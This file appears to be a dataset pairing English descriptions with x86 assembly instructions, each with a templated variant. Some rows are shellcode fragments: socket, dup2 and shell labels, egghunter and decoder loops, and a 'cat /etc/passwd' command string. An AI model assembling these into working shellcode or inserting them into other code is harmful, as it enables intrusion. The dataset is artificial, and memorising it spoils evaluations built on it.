raw_nl,temp_nl,raw_code,temp_code
define the _appendfile label,define var0 label,_appendfile :,var0 :
define the _build label,define var0 label,_build :,var0 :
define the _child label,define var0 label,_child :,var0 :
define the _close label,define var0 label,_close :,var0 :
define the _cmd label,define var0 label,_cmd :,var0 :
define the _continue label,define var0 label,_continue :,var0 :
define the _dup2_loop label,define var0 label,_dup2_loop :,var0 :
define the _exec label,define var0 label,_exec :,var0 :
define the _execline label,define var0 label,_execline :,var0 :
define the _exit label,define var0 label,_exit :,var0 :
define ip equal to 0x0100007f,define ip equal var0,_ip equ 0x0100007f,_ip equ var0
define the _isegg label,define var0 label,_isegg :,var0 :
define the _load_data label,define _load_data label,_load_data :,_load_data :
define the _next label,define var0 label,_next :,var0 :
define the _params label,define var0 label,_params :,var0 :
define the _parent_read label,define _parent_read label,_parent_read :,_parent_read :
define the _parent label,define _parent label,_parent :,_parent :
define the _random label,define var0 label,_random :,var0 :
define the _return label,define _return label,_return :,_return :
define the _setsockopt label,define _setsockopt label,_setsockopt :,_setsockopt :
define the _shell label,define var0 label,_shell :,var0 :
define the _socket label,define var0 label,_socket :,var0 :
define the _start label,define var0 label,_start :,var0 :
define the _user label,define _user label,_user :,_user :
define the _while_loop label,define _while_loop label,_while_loop :,_while_loop :
define the _write label,define var0 label,_write :,var0 :
define the numeric label 1,define numeric label 1,1 :,1 :
define the label 1,define label 1,1 :,1 :
define the label 2,define label 2,2 :,2 :
define the numeric label 2,define numeric label 2,2 :,2 :
define the label 3,define label 3,3 :,3 :
define the numeric label 3,define numeric label 3,3 :,3 :
allocate one byte of memory for a_letter variable and initialize it to 'd',allocate one byte memory var0 var1 variable and initialize it var3,a_letter db 'd',var1 db var3
add esi into memory address ebp-4,add var0 memory address ebp-4,"add [ebp-4] , esi","add [var1] , var0"
add the contents of the bh register into the ah register,add contents bh register var0 register,"add ah , bh","add var0 , bh"
add 0x25 to the al register,add var0 al register,"add al , 0x25","add al , var0"
add 0x3 to the contents in al and save the result in al,add var0 contents al and save result al,"add al , 0x3","add al , var0"
add 0x33 to the contents in al and save the result in al,add var0 contents al and save result al,"add al , 0x33","add al , var0"
add 0x66 to the contents in al and save the result in al,add var0 contents al and save result al,"add al , 0x66","add al , var0"
add 0xa to the al register,add var0 al register,"add al , 0xa","add al , var0"
add 0xb to the al register,add var0 al register,"add al , 0xb","add al , var0"
add byte '0' to al,add byte var0 al,"add al , byte '0'","add al , byte var0"
add the byte in edi to the al register,add byte var0 al register,"add al , byte [edi]","add al , byte [var0]"
add memory[di + 20] to ax,add memory [var1] ax,"add ax , [di+20]","add ax , [di+20]"
add 01 to ax,add 01 ax,"add ax , 01","add ax , 01"
add 0x2 to the contents in bl and save the result in bl,add var0 contents var1 and save result var1,"add bl , 0x2","add var1 , var0"
add ax to bx,add ax var0,"add bx , ax","add var0 , ax"
add 0x4 from the byte at the address edi and negate the result,add var0 byte address var1 and negate result,"add byte [edi] , 0x4 \n not byte [edi]","add byte [var1] , var0 \n not byte [var1]"
add the byte at the address edi after subtracting the value 7,add byte address var0 after subtracting value 7,"add byte [edi] , 7 \n not byte [edi]","add byte [var0] , 7 \n not byte [var0]"
add the value 8 from the byte in edi and negate it,add value 8 byte var0 and negate it,"add byte [edi] , 8 \n not byte [edi]","add byte [var0] , 8 \n not byte [var0]"
add 0x1 from the current byte of the shellcode and negate the result,add var0 current byte shellcode and negate result,"add byte [esi] , 0x1 \n not byte [esi]","add byte [esi] , var0 \n not byte [esi]"
add 0x1 from the byte at the address esi and negate the result,add var0 byte address var1 and negate result,"add byte [esi] , 0x1 \n not byte [esi]","add byte [var1] , var0 \n not byte [var1]"
add the value 0x9 from the current byte of the shellcode and then negate the result,add value var0 current byte shellcode and then negate result,"add byte [esi] , 0x9 \n not byte [esi]","add byte [esi] , var0 \n not byte [esi]"
negate the byte at the address esi after adding the value 2,negate byte address var0 after adding value 2,"add byte [esi] , 2 \n not byte [esi]","add byte [var0] , 2 \n not byte [var0]"
add the value 3 from the byte in esi and negate it,add value 3 byte var0 and negate it,"add byte [esi] , 3 \n not byte [esi]","add byte [var0] , 3 \n not byte [var0]"
add 10 to the single byte stored at memory address var,add 10 single byte stored memory address var,"add byte [var] , 10","add byte [var] , 10"
add 20 to the single byte stored at memory address var,add 20 single byte stored memory address var,"add byte [var] , 20","add byte [var] , 20"
add an immediate operand 65 to byte_value,add immediate operand 65 var0,"add byte_value , 65","add var0 , 65"
add the register dl in the memory location byte_value,add register dl memory location var0,"add byte_value , dl","add var0 , dl"
add 0x2 to the contents in cl and save the result in cl,add var0 contents cl and save result cl,"add cl , 0x2","add cl , var0"
add 0xb8 to the cl register,add var0 cl register,"add cl , 0xb8","add cl , var0"
add the value 0x1b into the dx register,add value var0 var1 register,"add dx , 0x1b","add var1 , var0"
add 0x2f2f to the contents in dx and save the result in dx,add var0 contents var1 and save result var1,"add dx , 0x2f2f","add var1 , var0"
add the contents of the local variable stored at ebp-4 into eax,add contents local variable stored var0 var1,"add eax , [ebp-4]","add var1 , [var0]"
add 0x10 to eax,add var0 var1,"add eax , 0x10","add var1 , var0"
add 0x12345678 to the contents in eax and save the result in eax,add var0 contents var1 and save result var1,"add eax , 0x12345678","add var1 , var0"
add 0x2d383638 to the contents in eax and save the result in eax,add var0 contents var1 and save result var1,"add eax , 0x2d383638","add var1 , var0"
add 0x31179798 to the contents in eax and save the result in eax,add var0 contents var1 and save result var1,"add eax , 0x31179798","add var1 , var0"
add 0x5 to edx and jump to L2 if the result is not 0,add var0 var1 and jump var2 if result not 0,"add eax , 0x5 \n jnz L2","add eax , var0 \n jnz var2"
add the value 0x7 to eax and jump to the label L4 if the sum is not zero,add value var0 var2 and jump label var3 if sum not zero,"add eax , 0x7 \n jnz L4","add var2 , var0 \n jnz var3"
add 1 to ebx and jump to L1 if the result is not zero,add 1 var0 and jump var1 if result not zero,"add eax , 1 \n jnz L1","add eax , 1 \n jnz var1"
add 10 to eax,add 10 var0,"add eax , 10","add var0 , 10"
add 10 to the contents of eax,add 10 contents var0,"add eax , 10","add var0 , 10"
add 16 to eax,add 16 var0,"add eax , 16","add var0 , 16"
add 2 to the contents of the eax register,add 2 contents var0 register,"add eax , 2","add var0 , 2"
add 2 to the eax register,add 2 var0 register,"add eax , 2","add var0 , 2"
add decimal 2 to eax register,add decimal 2 var0 register,"add eax , 2","add var0 , 2"
add 24 to eax,add 24 var0,"add eax , 24","add var0 , 24"
add 4 to eax,add 4 var0,"add eax , 4","add var0 , 4"
add 40000h to eax register,add var0 var1 register,"add eax , 40000h","add var1 , var0"
add 48 to eax,add 48 var0,"add eax , 48","add var0 , 48"
add the value 9 to eax and jump to decode if the result is not zero,add value 9 var0 and jump decode if result not zero,"add eax , 9 \n jnz decode","add var0 , 9 \n jnz decode"
add c to eax,add c var0,"add eax , c","add var0 , c"
add ebx to eax,add var0 var1,"add eax , ebx","add var1 , var0"
add ebx to eax and store the result in eax,add var0 var1 and store result var1,"add eax , ebx","add var1 , var0"
add edx to eax,add var0 var1,"add eax , edx","add var1 , var0"
add the contents of edx to the contents of eax,add contents var0 contents var1,"add eax , edx","add var1 , var0"
add the contents of the edx register to the contents of eax register,add contents var0 register contents var1 register,"add eax , edx","add var1 , var0"
add the contents of esi to the contents of eax,add contents var0 contents var1,"add eax , esi","add var1 , var0"
add the contents of the esi register to the contents of eax register,add contents var0 register contents var1 register,"add eax , esi","add var1 , var0"
add 0x2 to the contents of ebp,add var0 contents var1,"add ebp , 0x2","add var1 , var0"
add 16 to ebx,add 16 var0,"add ebx , 16","add var0 , 16"
add decimal integer 2 to ebx,add decimal integer 2 var0,"add ebx , 2","add var0 , 2"
add 2 to the contents of the ebx register,add 2 contents var0 register,"add ebx , 2","add var0 , 2"
add 48 to ebx,add 48 var0,"add ebx , 24","add var0 , 24"
add 3 to the contents of the ebx register,add 3 contents var0 register,"add ebx , 3","add var0 , 3"
add decimal integer 5 to ebx,add decimal integer 5 var0,"add ebx , 5","add var0 , 5"
add ecx to ebx,add var0 var1,"add ebx , ecx","add var1 , var0"
add 16 to ecx,add 16 var0,"add ecx , 16","add var0 , 16"
add ebx to ecx,add var0 var1,"add ecx , ebx","add var1 , var0"
add the contents of edi to the contents of edi,add contents var0 contents var0,"add edi , edi","add var0 , var0"
add the contents of the edi register to the contents of edi register,add contents var0 register contents var0 register,"add edi , edi","add var0 , var0"
set edx to next 16 byte block,set var0 next 16 byte block,"add edx , 16","add var0 , 16"
add 32 to edx,add 32 var0,"add edx , 32","add var0 , 32"
add 48 to edx,add 48 var0,"add edx , 48","add var0 , 48"
add 64 to the contents of the edx register,add 64 contents var0 register,"add edx , 64","add var0 , 64"
add the contents of eax to the contents of edx,add contents var0 contents var1,"add edx , eax","add var1 , var0"
add the contents of the eax register to the contents of edx register,add contents var0 register contents var1 register,"add edx , eax","add var1 , var0"
add the contents of the eax register to the edx register,add contents var0 register var1 register,"add edx , eax","add var1 , var0"
add ecx to edx,add var0 var1,"add edx , ecx","add var1 , var0"
add 0x21354523 to the contents in esi and save the result in esi,add var0 contents var1 and save result var1,"add esi , 0x21354523","add var1 , var0"
add 0x21354523 to the contents of esi,add var0 contents var1,"add esi , 0x21354523","add var1 , var0"
add 0x30 to esi,add var0 var1,"add esi , 0x30","add var1 , var0"
add 0x33333333 value to esi,add var0 value var1,"add esi , 0x33333333","add var1 , var0"
add 0x3f3f3f3f to the contents in esi and save the result in esi,add var0 contents var1 and save result var1,"add esi , 0x3f3f3f3f","add var1 , var0"
add 4 to esi,add 4 var0,"add esi , 4","add var0 , 4"
add the contents of the eax register to the contents of esi register,add contents var0 register contents var1 register,"add esi , eax","add var1 , var0"
add eax to esi,add var0 var1,"add esi , eax","add var1 , var0"
add 0x20 to the contents in esp and save the result in esp,add var0 contents esp and save result esp,"add esp , 0x20","add esp , var0"
add 3 to the contents of esp,add 3 contents esp,"add esp , 3","add esp , 3"
add 3 to the contents of the esp register,add 3 contents esp register,"add esp , 3","add esp , 3"
add 4 to the esp register,add 4 esp register,"add esp , 4","add esp , 4"
add 10 to the variable marks,add 10 variable marks,"add marks , 10","add marks , 10"
define the byte addr and initialize it to 0x1,define byte var0 and initialize it var1,addr : db 0x1,var0 : db var1
define the all label,define all label,all :,all :
define the doubleword an_integer and initialize it to 12425,define doubleword var0 and initialize it 12425,an_integer dd 12425,var0 dd 12425
perform a logical and operation between the al register and the 0fh value and store the result in the al register,perform logical and operation al register and var0 value and store result al register,"and al , 0fh","and al , var0"
perform logical and between ax and 1,perform logical and ax and 1,"and ax , 1","and ax , 1"
mask out lowest 4 bits of the eax register,mask out lowest 4 bits var0 register,"and eax , 0000000fh","and var0 , 0000000fh"
clear all but the last 4 bits of eax,clear all but last 4 bits var0,"and eax , 0fh","and var0 , 0fh"
perform and operation between eax and 3f465456 and save the result in eax,perform and operation var0 and var2 and save result var0,"and eax , 3f465456","and var0 , var2"
perform and operation between eax and 40392b29 and save the result in eax,perform and operation var0 and 40392b29 and save result var0,"and eax , 40392b29","and var0 , 40392b29"
mask out lowest 4 bits of the ebx register,mask out lowest 4 bits var0 register,"and ebx , 0000000fh","and var0 , 0000000fh"
mask out lowest 4 bits of the ecx register,mask out lowest 4 bits var0 register,"and ecx , 0000000fh","and var0 , 0000000fh"
mask out lowest 4 bits of the edx register,mask out lowest 4 bits var0 register,"and edx , 0000000fh","and var0 , 0000000fh"
perform and operation on the variable mask1 and 128,perform and operation variable var0 and 128,"and mask1 , 128","and var0 , 128"
define the doubleword arr and initialize it to 100,define doubleword var0 and initialize it 100,arr dd 100,var0 dd 100
define the doubleword arr and initialize it to 50,define doubleword var0 and initialize it 50,arr dd 50,var0 dd 50
reserve the array arr1 of 400 uninitialized bytes,reserve array var0 400 var1 bytes,arr1 resb 400,var0 resb 400
define the doubleword arr and initialize it to 20,define doubleword var0 and initialize it 20,array dd 20,array dd 20
define an array of 20 initialized word,define array 20 initialized word,array word 20,array word 20
define an array of 5 initialized word,define array 5 initialized word,array word 5,array word 5
create variable b in memory and initialize to zero,create variable b memory and initialize zero,b : dd 0x0,b : dd 0x0
define the doubleword variable big_number and initialize it to 123456789,define doubleword variable var0 and initialize it 123456789,big_number dd 123456789,var0 dd 123456789
reserve 1 word at location bignum,reserve 1 word location var0,bignum : resw 1,var0 : resw 1
reserve 64 bytes for buffer,reserve 64 bytes var0 buffer,buffer : resb 64,buffer : resb 64
declare buffersize to be a word containing 1024,declare var0 be word containing 1024,buffersize : dw 1024,var0 : dw 1024
"define a tables of bytes byte_table and initialize to 14, 15 and 22","define tables bytes var0 and initialize 14, 15 and 22","byte_table db 14 , 15 , 22 , 45","var0 db 14 , 15 , 22 , 45"
define the byte value byte_value and initialize it to 150,define byte value var0 and initialize it 150,byte_value db 150,var0 db 150
define the byte value bytes and initialize it to 10,define byte value bytes and initialize it 10,bytes db 10,bytes db 10
define the byte value bytes and initialize it to 20,define byte value bytes and initialize it 20,bytes db 20,bytes db 20
call the _appendfile function,call var0 function,call _appendfile,call var0
call the _build function,call var0 function,call _build,call var0
call _continue,call var0,call _continue,call var0
call the _continue function,call var0 function,call _continue,call var0
call the _exec function,call var0 function,call _exec,call var0
call _exit,call var0,call _exit,call var0
call _malloc,call var0,call _malloc,call var0
call the _params function,call var0 function,call _params,call var0
call the _printf function,call var0 function,call _printf,call var0
call the _write function,call var0 function,call _write,call var0
call the function in esp,call function esp,call [esp],call [esp]
call the atoi function,call var0 function,call atoi,call var0
call the code function,call var0 function,call code,call var0
call the doit function,call var0 function,call doit,call var0
call the egghunter function,call var0 function,call egghunter,call var0
call esi,call var0,call esi,call var0
call the function in esi,call function var0,call esi,call var0
call esp,call esp,call esp,call esp
call the execute function,call var0 function,call execute,call var0
call function internetreadfile,call function var0,call internetreadfile,call var0
call the iprint function,call var0 function,call iprint,call var0
call the iprintlf function,call var0 function,call iprintlf,call var0
call jmp_search,call var0,call jmp_search,call var0
call the jmp_search function,call var0 function,call jmp_search,call var0
call the loader function,call var0 function,call loader,call var0
call the main function,call var0 function,call main,call var0
call the me function,call var0 function,call me,call var0
call my_subroutine,call var0,call my_subroutine,call var0
call the near function,call var0 function,call near stageaddress,call var0 stageaddress
call the one function,call var0 function,call one,call var0
call the prepare function,call var0 function,call prepare,call var0
call the quit function,call var0 function,call quit,call var0
call the set_argv function,call var0 function,call set_argv,call var0
call the shell_ret function,call var0 function,call shell_ret,call var0
call the shellcode function,call shellcode function,call shellcode,call shellcode
call the sprint function,call var0 function,call sprint,call var0
call the sprintlf function,call var0 function,call sprintlf,call var0
call the start function,call var0 function,call start,call var0
call the strlen function,call var0 function,call strlen,call var0
call the two function,call var0 function,call two,call var0
call the write function,call var0 function,call write,call var0
call the writestring function,call var0 function,call writestring,call var0
define the call_decoded label,define var0 label,call_decoded :,var0 :
define the call_decoder label,define var0 label,call_decoder :,var0 :
define the call_egghunter label,define var0 label,call_egghunter :,var0 :
declare the call_shellcode label,declare var0 label,call_shellcode :,var0 :
define the call_shellcode label,define var0 label,call_shellcode :,var0 :
define the callit label,define var0 label,callit :,var0 :
define the callme label,define var0 label,callme :,var0 :
define the callpop function,define var0 function,callpop :,var0 :
define the callpop label,define var0 label,callpop :,var0 :
clear the edx register,clear var0 register,cdq,cdq
extend the sign bit of the eax register into the edx register,extend sign bit var0 register var1 register,cdq,cdq
extend the sign bit of eax register into the edx register,extend sign bit var0 register var1 register,cdq,cdq
extend the sign bit of eax into the edx register,extend sign bit var0 var1 register,cdq,cdq
define check_even_odd function,define var0 function,check_even_odd :,var0 :
define the child label,define child label,child :,child :
define chmod_call equal to 15,define var0 equal 15,chmod_call equ 15,var0 equ 15
define variable choice of 1 byte and initialize to y,define variable choice 1 byte and initialize y,choice db 'y',choice db 'y'
set the direction flag to zero,set direction flag zero,cld,cld
direction flag equal to zero,direction flag equal zero,cld,cld
clear the direction flag,clear direction flag,cld,cld
define close_syscall equal to 6,define var0 equal 6,close_syscall equ 6,var0 equ 6
define the closefile function,define var0 function,closefile :,var0 :
define the closefile label,define var0 label,closefile :,var0 :
define the cmd label,define var0 label,cmd :,var0 :
declare cmd string and initialize it to 'cat /etc/passwd',declare var0 string and initialize it var1,cmd : db 'cat /etc/passwd',var0 : db var1
define cmd as the byte string 'cat /etc/passwd',define var0 byte string var1,cmd : db 'cat /etc/passwd',var0 : db var1
compare the contents stored at ebp+arg_0 with 1,compare contents stored var0 1,"cmp [ebp+arg_0] , 1","cmp [var0] , 1"
compare if the contents at memory location ebp+var_a is 0,compare if contents memory location var0 0,"cmp [ebp+var_a] , 0","cmp [var0] , 0"
compare the contents at memory location ebp+var_a with 0,compare contents memory location var0 0,"cmp [ebp+var_a] , 0","cmp [var0] , 0"
jump short to the memory location loc_4010E5 if the contents of the memory address ebp+var_a is not equal to zero,jump short memory location var0 if contents memory address var2 not equal zero,"cmp [ebp+var_a] , 0 \n jnz short loc_4010E5","cmp [var2] , 0 \n jnz short var0"
if the contents of the memory address ebp+var_a is not equal to zero then jump short to the memory location loc_4010E5,if contents memory address var0 not equal zero then jump short memory location var1,"cmp [ebp+var_a] , 0 \n jnz short loc_4010E5","cmp [var0] , 0 \n jnz short var1"
compare the contents at memory location esi and the contents of the edx register,compare contents memory location var0 and contents var1 register,"cmp [esi] , edx","cmp [var0] , var1"
compare the contents at memory location esi with edx,compare contents memory location var0 var1,"cmp [esi] , edx","cmp [var0] , var1"
jump to the memory address 0x40 if the contents of the al register is equal to the value 0x38 else push the byte representation of the value 0x1 onto the stack,jump memory address var0 if contents al register equal value var1 else push byte representation value var2 stack,"cmp al , 0x38 \n je 0x40 \n push byte 0x1","cmp al , var1 \n je var0 \n push byte var2"
if the contents of the al register is equal to the value 0x38 then jump to the memory address 0x40 else push the byte representation of the value 0x1 onto the stack,if contents al register equal value var0 then jump memory address var1 else push byte representation value var2 stack,"cmp al , 0x38 \n je 0x40 \n push byte 0x1","cmp al , var0 \n je var1 \n push byte var2"
jump to the decode_insertion label if the contents of the al register is equal to the vale 0xaa else perform a logical xor operation between the al register and the bl register and store the result in the al register,jump var0 label if contents al register equal vale var1 else perform logical xor operation al register and var3 register and store result al register,"cmp al , 0xaa \n je decode_insertion \n xor al , bl","cmp al , var1 \n je var0 \n xor al , var3"
if the contents of the al register is equal to the vale 0xaa then jump to the decode_insertion label else perform a logical xor operation between the al register and the bl register and store the result in the al register,if contents al register equal vale var0 then jump var2 label else perform logical xor operation al register and var3 register and store result al register,"cmp al , 0xaa \n je decode_insertion \n xor al , bl","cmp al , var0 \n je var2 \n xor al , var3"
compare if the contents of al with 0xf2,compare if contents al var0,"cmp al , 0xf2","cmp al , var0"
compare the contents of the al register and 0xf2,compare contents al register and var0,"cmp al , 0xf2","cmp al , var0"
compare the contents of the al register with the value 0xf2,compare contents al register value var0,"cmp al , 0xf2","cmp al , var0"
jump to the _start label if the contents of the al register is equal to the value 0xf2,jump var0 label if contents al register equal value var1,"cmp al , 0xf2 \n je _start","cmp al , var1 \n je var0"
if the contents of the al register is equal to the value 0xf2 then jump to the _start label,if contents al register equal value var0 then jump var1 label,"cmp al , 0xf2 \n je _start","cmp al , var0 \n je var1"
jump to the _start label if the contents of the al register is equal to the value 0xf2 else move the value 0x50905090 into the eax register,jump var0 label if contents al register equal value var1 else move value var2 var4 register,"cmp al , 0xf2 \n je _start \n mov eax , 0x50905090","cmp al , var1 \n je var0 \n mov var4 , var2"
if the contents of the al register is equal to the value 0xf2 then jump to the _start label else move the value 0x50905090 into the eax register,if contents al register equal value var0 then jump var1 label else move value var2 var4 register,"cmp al , 0xf2 \n je _start \n mov eax , 0x50905090","cmp al , var0 \n je var1 \n mov var4 , var2"
jump to the fillOnes label if the contents of the al register is equal to the value 0xf2,jump var0 label if contents al register equal value var1,"cmp al , 0xf2 \n je fillOnes","cmp al , var1 \n je var0"
if the contents of the al register is equal to the value 0xf2 then jump to the fillOnes label,if contents al register equal value var0 then jump var1 label,"cmp al , 0xf2 \n je fillOnes","cmp al , var0 \n je var1"
jump to the fillOnes label if the contents of the al register is equal to 0xf2 else move the value 0x59935193 into the eax register,jump var0 label if contents al register equal var1 else move value var2 var4 register,"cmp al , 0xf2 \n je fillOnes \n mov eax , 0x59935193","cmp al , var1 \n je var0 \n mov var4 , var2"
if the contents of the al register is equal to 0xf2 then jump to the fillOnes label else move the value 0x59935193 into the eax register,if contents al register equal var0 then jump var1 label else move value var2 var4 register,"cmp al , 0xf2 \n je fillOnes \n mov eax , 0x59935193","cmp al , var0 \n je var1 \n mov var4 , var2"
jump to the label next_page if the contents of the al register is equal to the value 0xf2,jump label var0 if contents al register equal value var1,"cmp al , 0xf2 \n je next_page","cmp al , var1 \n je var0"
if the contents of the al register is equal to the value 0xf2 then jump to the label next_page,if contents al register equal value var0 then jump label var1,"cmp al , 0xf2 \n je next_page","cmp al , var0 \n je var1"
jump to the _start label if the contents of the al register is equal to the value 0xf2,jump var0 label if contents al register equal value var1,"cmp al , 0xf2 \n jz _start","cmp al , var1 \n jz var0"
if the contents of the al register is equal to the value 0xf2 then jump to the _start label,if contents al register equal value var0 then jump var1 label,"cmp al , 0xf2 \n jz _start","cmp al , var0 \n jz var1"
if the contents of the al register is equal to the value 0xf2 then jump to the incpage label,if contents al register equal value var0 then jump var1 label,"cmp al , 0xf2 \n jz incpage","cmp al , var0 \n jz var1"
jump to the incpage label if the contents of the al register is equal to the value 0xf2,jump var0 label if contents al register equal value var1,"cmp al , 0xf2 \n jz incpage","cmp al , var1 \n jz var0"
jump to the label l1 if the contents of the al register is greater than the decimal value 9,jump label var0 if contents al register greater decimal value 9,"cmp al , 9 \n jg l1","cmp al , 9 \n jg var0"
if the contents of the al register is greater than the decimal value 9 then jump to the label l1,if contents al register greater decimal value 9 then jump label var0,"cmp al , 9 \n jg l1","cmp al , 9 \n jg var0"
jump to the label l1 if the contents of the al register is greater than or equal to the decimal value 9,jump label var0 if contents al register greater or equal decimal value 9,"cmp al , 9 \n jge l1","cmp al , 9 \n jge var0"
if the contents of the al register is greater than or equal to the decimal value 9 then jump to the label l1,if contents al register greater or equal decimal value 9 then jump label var0,"cmp al , 9 \n jge l1","cmp al , 9 \n jge var0"
jump to the l2 label if the unsigned contents of the al register is greater than the unsigned contents of the bl register else add the value 3 to the eax register,jump var0 label if unsigned contents al register greater unsigned contents var1 register else add value 3 var2 register,"cmp al , bl \n ja l2 \n add eax , 3","cmp al , var1 \n ja var0 \n add var2 , 3"
if the unsigned contents of the al register is greater than the unsigned contents of the bl register then jump to the l2 label else add the value 3 to the eax register,if unsigned contents al register greater unsigned contents var0 register then jump var1 label else add value 3 var2 register,"cmp al , bl \n ja l2 \n add eax , 3","cmp al , var0 \n ja var1 \n add var2 , 3"
jump to the label l2 if the unsigned contents of the al register is lower than the unsigned contents of the bl register,jump label var0 if unsigned contents al register lower unsigned contents var1 register,"cmp al , bl \n jb l2","cmp al , var1 \n jb var0"
if the unsigned contents of the al register is lower than the unsigned contents of the bl register then jump to the label l2,if unsigned contents al register lower unsigned contents var0 register then jump label var1,"cmp al , bl \n jb l2","cmp al , var0 \n jb var1"
compare the contents of al with the cl register,compare contents al cl register,"cmp al , cl","cmp al , cl"
compare the contents of the al register and the contents of the cl register,compare contents al register and contents cl register,"cmp al , cl","cmp al , cl"
jump short to the decode label if the contents of the al register is not equal to the contents of the cl register else jump to the shellcode label,jump short decode label if contents al register not equal contents cl register else jump shellcode label,"cmp al , cl \n jne short decode \n jmp shellcode","cmp al , cl \n jne short decode \n jmp shellcode"
if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label,if contents ax register not equal contents var0 register then jump var1 label,"cmp ax , bx \n jne l3","cmp ax , var0 \n jne var1"
if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label else jump to the while label,if contents ax register not equal contents var0 register then jump var1 label else jump while label,"cmp ax , bx \n jne l3 \n jmp while","cmp ax , var0 \n jne var1 \n jmp while"
jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register else jump to the while label,jump var0 label if contents ax register not equal contents var1 register else jump while label,"cmp ax , bx \n jne l3 \n jmp while","cmp ax , var1 \n jne var0 \n jmp while"
compare the contents of bh and the contents of al,compare contents bh and contents al,"cmp bh , al","cmp bh , al"
compare the contents of bl and 0x1f,compare contents var0 and var1,"cmp bl , 0x1f","cmp var0 , var1"
jump to the memory address 0xf3 if the unsigned contents of the bl register is lower than the unsigned value 0x1f else add the 0x40 value to the al register,jump memory address 0xf3 if unsigned contents var0 register lower unsigned value var1 else add var2 value al register,"cmp bl , 0x1f \n jb 0xf3 \n add al , 0x40","cmp var0 , var1 \n jb 0xf3 \n add al , var2"
if the unsigned contents of the bl register is lower than the unsigned value 0x1f then jump to the memory address 0xf3 else add the 0x40 value to the al register,if unsigned contents var0 register lower unsigned value var1 then jump memory address 0xf3 else add var2 value al register,"cmp bl , 0x1f \n jb 0xf3 \n add al , 0x40","cmp var0 , var1 \n jb 0xf3 \n add al , var2"
jump to the shellcode label if the contents of the bl register is equal to the value 0xaa,jump shellcode label if contents var0 register equal value var1,"cmp bl , 0xaa \n je shellcode","cmp var0 , var1 \n je shellcode"
jump to the xordecode label if the contents of the bl register is equal to the value 0xbb else jump to the notdecode label,jump var0 label if contents var1 register equal value var2 else jump var3 label,"cmp bl , 0xbb \n je xordecode \n jmp notdecode","cmp var1 , var2 \n je var0 \n jmp var3"
compare ebx register's lower half value against ascii value 48,compare var0 register's lower half value var2 ascii value 48,"cmp bl , 48","cmp bl , 48"
compare ebx register's lower half value against ascii value 57,compare var0 register's lower half value var2 ascii value 57,"cmp bl , 57","cmp bl , 57"
jump to the memory location loc_402B1D if the contents of the bl register is greater than the value 78h,jump memory location var0 if contents var1 register greater value var2,"cmp bl , 78h \n jg short loc_402B1D","cmp var1 , var2 \n jg short var0"
if the contents of the bl register is greater than the value 78h then jump to the memory location loc_402B1D,if contents var0 register greater value var1 then jump memory location var2,"cmp bl , 78h \n jg short loc_402B1D","cmp var0 , var1 \n jg short var2"
jump to the memory location loc_402B1D if the contents of the bl register is greater than or equal to the value 78h,jump memory location var0 if contents var1 register greater or equal value var2,"cmp bl , 78h \n jge short loc_402B1D","cmp var1 , var2 \n jge short var0"
if the contents of the bl register is greater than or equal to the value 78h then jump to the memory location loc_402B1D,if contents var0 register greater or equal value var1 then jump memory location var2,"cmp bl , 78h \n jge short loc_402B1D","cmp var0 , var1 \n jge short var2"
jump to the memory location loc_402B1D if the contents of the bl register is less than the value 78h,jump memory location var0 if contents var1 register less value var2,"cmp bl , 78h \n jl short loc_402B1D","cmp var1 , var2 \n jl short var0"
if the contents of the bl register is less than the value 78h then jump to the memory location loc_402B1D,if contents var0 register less value var1 then jump memory location var2,"cmp bl , 78h \n jl short loc_402B1D","cmp var0 , var1 \n jl short var2"
jump to the memory location loc_402B1D if the contents of the bl register is less than or equal to the value 78h,jump memory location var0 if contents var1 register less or equal value var2,"cmp bl , 78h \n jle short loc_402B1D","cmp var1 , var2 \n jle short var0"
if the contents of the bl register is less than or equal to the value 78h then jump to the memory location loc_402B1D,if contents var0 register less or equal value var1 then jump memory location var2,"cmp bl , 78h \n jle short loc_402B1D","cmp var0 , var1 \n jle short var2"
jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register,jump var0 label if contents var1 register equal contents al register,"cmp bl , al \n je loop_2","cmp var1 , al \n je var0"
if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label,if contents var0 register equal contents al register then jump var1 label,"cmp bl , al \n je loop_2","cmp var0 , al \n je var1"
jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register else jump short to the not_found label,jump var0 label if contents var1 register equal contents al register else jump short var2 label,"cmp bl , al \n je loop_2 \n jmp short not_found","cmp var1 , al \n je var0 \n jmp short var2"
if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label else jump short to the not_found label,if contents var0 register equal contents al register then jump var1 label else jump short var2 label,"cmp bl , al \n je loop_2 \n jmp short not_found","cmp var0 , al \n je var1 \n jmp short var2"
compare the byte at the memory location buff with 61h,compare byte memory location buff 61h,"cmp byte [buff] , 61h","cmp byte [buff] , 61h"
compare the byte at the memory location buff with 7ah,compare byte memory location buff var0,"cmp byte [buff] , 7ah","cmp byte [buff] , var0"
compare the byte pointed to by eax at this address against zero,compare byte pointed var0 var1 address var2 zero,"cmp byte [eax] , 0","cmp byte [var0] , 0"
compare the byte at the memory location ebp+ecx with 61h,compare byte memory location var0 61h,"cmp byte [ebp+ecx] , 61h","cmp byte [var0] , 61h"
compare the byte at the memory location ebp+ecx with 7ah,compare byte memory location var0 var1,"cmp byte [ebp+ecx] , 7ah","cmp byte [var0] , var1"
jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e,jump var0 label if byte starting address contained var1 register not equal byte value var2,"cmp BYTE [edx] , 0x2e \n jne l2","cmp BYTE [var1] , var2 \n jne var0"
if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label,if byte starting address contained var0 register not equal byte value var1 then jump var2 label,"cmp BYTE [edx] , 0x2e \n jne l2","cmp BYTE [var0] , var1 \n jne var2"
jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e else jump to the while label,jump var0 label if byte starting address contained var1 register not equal byte value var2 else jump while label,"cmp BYTE [edx] , 0x2e \n jne l2 \n jmp while","cmp BYTE [var1] , var2 \n jne var0 \n jmp while"
if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label else jump to the while label,if byte starting address contained var0 register not equal byte value var1 then jump var2 label else jump while label,"cmp BYTE [edx] , 0x2e \n jne l2 \n jmp while","cmp BYTE [var0] , var1 \n jne var2 \n jmp while"
compare the byte in esi with 0x7,compare byte var0 var1,"cmp byte [esi] , 0x7","cmp byte [var0] , var1"
